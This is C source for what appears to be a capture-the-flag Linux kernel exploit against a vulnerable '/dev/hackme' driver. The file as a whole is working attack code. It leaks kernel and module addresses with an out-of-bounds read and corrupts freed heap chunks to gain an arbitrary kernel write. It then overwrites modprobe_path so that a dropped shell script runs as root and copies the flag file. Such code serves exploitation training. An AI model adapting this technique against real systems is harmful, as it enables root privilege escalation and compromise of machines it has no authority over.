#define _GNU_SOURCE
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>
#include <sched.h>
#include <errno.h>
#include <pty.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/ipc.h>
#include <sys/sem.h>
#include <signal.h>

size_t modprobe_path = 0x83f960;
int fd = 0;
typedef struct pool{
    size_t idx;
    char* buf;
    size_t size;
    size_t off;
}Kpool;

void err(char* buf){
    printf("%s Error\n", buf);
    exit(-1);
}

void Add(size_t idx, size_t sz, char* buf){
    Kpool pl;
    pl.idx = idx;
    pl.buf = buf;
    pl.size = sz;
    if(-1 == ioctl(fd, 196608, &pl)){
        err("Add");
    }
}

void Delete(size_t idx){
    Kpool pl;
    pl.idx = idx;
    if(-1 == ioctl(fd, 196609, &pl)){
        err("Delete");
    }
}

void Input(size_t idx, size_t sz, char* buf, size_t off){
    Kpool pl;
    pl.idx = idx;
    pl.buf = buf;
    pl.size = sz;
    pl.off = off;
    if(-1 == ioctl(fd, 196610, &pl)){
        err("Input");
    }
}

void Output(size_t idx, size_t sz, char* buf, size_t off){
    Kpool pl;
    pl.idx = idx;
    pl.buf = buf;
    pl.size = sz;
    pl.off = off;
    if(-1 == ioctl(fd, 196611, &pl)){
        err("Output");
    }
}

int main(){
    system("echo -ne '#!/bin/sh\n/bin/cp /flag /home/pwn/flag\n/bin/chmod 777 /home/pwn/flag' > /home/pwn/getflag.sh");
    system("chmod +x /home/pwn/getflag.sh");
    system("echo -ne '\\xff\\xff\\xff\\xff' > /home/pwn/ll");
    system("chmod +x /home/pwn/ll");
    fd = open("/dev/hackme", 0);
    if(fd < 0){
        err("Open dev");
    }
    size_t ssize = 0x400;
    size_t size1 = 0x100;
    char bufA[0x100] = { 0 };
    char bufB[0x400] = { 0 };
    memset(bufA, 'A', 0x100);
    memset(bufB, 'B', 0x400);
    int chunkId = 0;
    puts("Add now");
    Add(chunkId++, ssize, bufB);
    Add(chunkId++, size1, bufA);
    memset(bufA, 'B', 0x100);
    Add(chunkId++, size1, bufA);
    memset(bufA, 'C', 0x100);
    Add(chunkId++, size1, bufA);
    memset(bufA, 'D', 0x100);
    Add(chunkId++, size1, bufA);  //4
    memset(bufA, '5', 0x100);
    Add(chunkId++, size1, bufA);  //5

    puts("Leak addr:");
    char* buffer = malloc(0x1000);
    memset(buffer, '\x00', 0x1000);

    Output(0, 0x800+0x20, buffer, -0x800);
    size_t module_addr = 0x0;
    size_t vmlinux_addr = 0x0;
    module_addr = *(size_t*)(buffer+0x70)-0x1000;
    vmlinux_addr = *(size_t*)(buffer+0x40)-0x6de30;
    printf("module_addr: 0x%llx, vmlinux_addr: 0x%llx, mod:0x%llx\n", module_addr, vmlinux_addr,modprobe_path+vmlinux_addr);
    size_t pool_addr = module_addr + 0x2400;

    Delete(2);
    Delete(4);
    memset(buffer, "\x00", 0x1000);
    *(size_t*)buffer = pool_addr+0xc0;
    Input(5, 0x100, buffer,-0x100);

    char path[30] = "/home/pwn/getflag.sh\x00";
    strncpy(bufA, path, 30);

    Add(6, size1, buffer);
    Add(7, size1, buffer);  //pool
    *(size_t*)buffer = modprobe_path+vmlinux_addr;
    *(size_t*)(buffer+0x8) = 0x100;
    Input(7, 0x10, buffer, 0);
    Input(0xc, 30, bufA, 0);

    system("/home/pwn/ll");
    system("cat /home/pwn/flag");

    return 0;
}

